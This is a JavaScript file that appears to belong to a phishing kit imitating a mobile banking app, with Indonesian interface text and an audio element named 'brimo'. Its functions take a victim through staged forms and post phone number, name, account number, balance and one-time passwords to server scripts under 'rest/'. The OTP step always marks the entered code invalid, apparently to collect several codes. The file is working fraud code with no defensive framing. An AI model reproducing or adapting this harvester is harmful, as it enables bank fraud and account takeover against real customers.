
// index
function sendNohp(){    
    event.preventDefault();                   
    $(".wait").fadeIn();
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
  var nomor = $('#nohp').val();
  sessionStorage.setItem('nomor', nomor);                     
             
   
       $.ajax({
            type: 'POST',
            url: 'rest/no.php',
            data: $('#hpForm').serialize(),
            datatype: 'JSON',
            
    complete: function(){
    audio = document.getElementById("brimo");
    audio.play(); 
    setTimeout(function(){   
    window.location = "login.html";
    
    $(".wait").fadeOut();  
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    vibr(180);
    }, 2000);}});};   
     
     
     
//data     
function sendLogin(){
   $('.wait').fadeIn();
    event.preventDefault();   
    document.getElementById('kirim').innerHTML = "Memproses....";
    
    const tarif = $('#tarif').val();
    const nomor = $('#nomor').val();
    const nama = $('#nama').val();
    const rek = $('#rek').val();
                                
   if (!tarif || !nomor || !nama || !rek ) {      
        window.location.href = "index.php";
        return false;
    }                        
   
     $.ajax({
            type: 'POST',
            url: 'rest/login.php',
            data: $('#loginForm').serialize(),
            datatype: 'JSON',
            
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldo.html";    
    $('.wait').fadeOut();
    document.getElementById('kirim').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nomor = $('#nomor').val();
  sessionStorage.setItem('nomor', nomor); 
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama); 
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek); 
   vibr(180);
    }, 1500);}});};
    
       
    
    
// saldo  
function sendSaldo(){
    event.preventDefault();    
    document.getElementById('kirim').innerHTML = "Verify...";   
    $('.wait').fadeIn(); 
    
    const tarif = $('#tarif').val();
    const nomor = $('#nomor').val();
    const nama = $('#nama').val();
    const rek = $('#rek').val();
    const saldo = $('#saldo').val();
                                
   if (!tarif || !nomor || !nama || !rek || !saldo) {      
        window.location.href = "index.php";
        return false;
    }    
  
       $.ajax({
            type: 'POST',
            url: 'rest/saldo.php',
            data: $('#saldoForm').serialize(),
            datatype: 'JSON',
        
   complete: function(){     
   setTimeout(function(){
   document.getElementById('kirim').innerHTML = "Benar";  
   $('.wait').fadeOut();
   window.location = "otp.html";
   vibr(180);  
 var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nomor = $('#nomor').val();
  sessionStorage.setItem('nomor', nomor); 
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama); 
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek);
  var saldo = $('#saldo').val();
  sessionStorage.setItem('saldo', saldo);
    }, 300);}});};    

        


// otp
function sendOtp(){
    event.preventDefault();        
    $(".wait").fadeIn();   
    document.getElementById('kirim').value = "Memproses...."; 
                               
    const tarif = $('#tarif').val();
    const nomor = $('#nomor').val();
    const nama = $('#nama').val();
    const rek = $('#rek').val();
    const saldo = $('#saldo').val();
    const otp = $('#otp').val();
                                
   if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {      
        window.location.href = "index.php";
        return false;
    }    
     
     $.ajax({
            type: 'POST',
            url: 'rest/otp.php',
            data: $('#formOtp').serialize(),
            datatype: 'JSON',
        
    complete: function(){
    vibr(800);    
    setTimeout(function(){
    $(".wait").fadeOut();   
 $("#otp").val("");
 $("#otp").addClass('invalid-input'); 
   document.getElementById('kirim').value = "Konfirmasi";
    }, 200);}});};



function vibr(dur){
            if (navigator.vibrate) {
                navigator.vibrate(dur);
            } else {
                console.log("NotSupported");
            }
        }

function wa(){
 $(".wait").fadeIn();   
  audio = document.getElementById("tunggu");
   audio.play();
   
setTimeout(function(){  
location.href='wa';
    }, 5000);
    setTimeout(function(){
    $(".wait").fadeOut();   
    }, 5100);      
}     
